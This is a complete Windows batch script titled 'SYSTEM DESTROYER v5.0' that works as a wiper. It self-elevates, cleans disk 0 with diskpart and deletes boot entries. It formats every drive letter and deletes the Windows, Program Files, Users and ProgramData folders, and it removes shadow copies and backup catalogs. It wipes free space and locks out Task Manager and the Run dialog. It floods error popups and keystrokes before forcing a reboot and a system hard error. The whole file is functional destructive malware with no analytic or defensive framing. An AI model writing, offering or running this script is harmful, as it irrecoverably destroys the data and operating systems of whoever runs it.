@echo off
setlocal enabledelayedexpansion

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

mode con: cols=80 lines=30
title SYSTEM DESTROYER v5.0 - FINAL MISSION

echo.
echo ========================================
echo    SYSTEM DESTROYER v5.0 - FINAL
echo ========================================
echo    PHASE 1: MBR/GPT DESTRUCTION
echo ========================================
echo.

echo [1] Destroying boot sectors...
(
echo select disk 0
echo clean
echo exit
) > %temp%\kill.dps
diskpart /s %temp%\kill.dps >nul 2>&1
bcdedit /delete {default} /f >nul 2>&1
bcdedit /delete {bootmgr} /f >nul 2>&1
del /f /q C:\bootmgr C:\boot\bcd >nul 2>&1

echo [2] Formatting ALL drives...
for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        echo y|format %%d: /FS:NTFS /Q /X /V:DEAD >nul 2>&1
        echo y|format %%d: /FS:FAT32 /Q /X /V:DEAD >nul 2>&1
    )
)

echo [3] KILLING SYSTEM FOLDERS...
start /min cmd /c "takeown /f C:\Windows /r /d y && icacls C:\Windows /grant everyone:F /t /c /q && rd /s /q C:\Windows"
start /min cmd /c "takeown /f C:\Program Files /r /d y && icacls C:\Program Files /grant everyone:F /t /c /q && rd /s /q C:\Program Files"
start /min cmd /c "takeown /f C:\Program Files (x86) /r /d y && icacls C:\Program Files (x86) /grant everyone:F /t /c /q && rd /s /q C:\Program Files (x86)"
start /min cmd /c "takeown /f C:\Users /r /d y && icacls C:\Users /grant everyone:F /t /c /q && rd /s /q C:\Users"
start /min cmd /c "takeown /f C:\ProgramData /r /d y && icacls C:\ProgramData /grant everyone:F /t /c /q && rd /s /q C:\ProgramData"

echo [4] Destroying recovery...
vssadmin delete shadows /all /quiet >nul 2>&1
wbadmin delete catalog -quiet >nul 2>&1
rd /s /q "C:\System Volume Information" 2>nul
rd /s /q "C:\$Recycle.Bin" 2>nul

echo [5] Wiping free space...
for %%d in (C D E F) do (
    if exist %%d:\ (
        echo   Wiping %%d:...
        start /min cipher /w:%%d:\
        echo   [DONE] Drive %%d: wiped
    )
)

echo.
echo ========================================
echo    STARTING INTERFACE DESTRUCTION
echo ========================================
echo.

echo [6] Killing explorer and blocking...
taskkill /f /im explorer.exe >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoStartMenuMorePrograms" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoSearchBox" /t REG_DWORD /d 1 /f >nul 2>&1

echo [7] Loading ERROR SYSTEM...
start /min powershell -WindowStyle Hidden -Command "while(1){Add-Type -AssemblyName System.Windows.Forms;$x=[System.Windows.Forms.Cursor]::Position.X;$y=[System.Windows.Forms.Cursor]::Position.Y;[System.Windows.Forms.MessageBox]::Show('FUCKED','ERROR',0,16);[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(($x+50),($y+50))}"

echo [8] Keyboard blocking...
start /min powershell -Command "$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.SendKeys]::SendWait('{F13}'); while(1){[System.Windows.Forms.SendKeys]::SendWait('{SCROLLLOCK}')}"

echo.
echo ========================================
echo    COUNTDOWN TO PC DEATH
echo ========================================
echo.

for /l %%i in (10,-1,1) do (
    echo ERROR [%%i]: SYSTEM FATAL ERROR - REBOOT IN %%i
    timeout /t 1 /nobreak >nul
    mode con: cols=!random:~-2,2! lines=!random:~-2,1!
    color !random:~-1,1!!random:~-1,1!
)

echo.
echo ========================================
echo    FINAL DESTRUCTION COMPLETE
echo    REBOOTING TO NOTHINGNESS...
echo ========================================
echo.

for /l %%i in (5,-1,0) do (
    echo SYSTEM WILL REBOOT IN %%i SECONDS
    echo ERROR: MEMORY_CORRUPTION_%%i
    timeout /t 1 /nobreak >nul
)

echo ERROR: CRITICAL_SYSTEM_FAILURE
echo ERROR: BOOT_DEVICE_NOT_FOUND
echo ERROR: NO_OPERATING_SYSTEM
echo.

start /min shutdown /r /f /t 0
wmic os where primary=1 call reboot >nul 2>&1
powershell -Command "Restart-Computer -Force"
rundll32.exe ntdll.dll,RtlAdjustPrivilege 19 1 0 >nul 2>&1
rundll32.exe ntdll.dll,NtRaiseHardError 0xC000021A 0 0 0 6 >nul 2>&1

exit
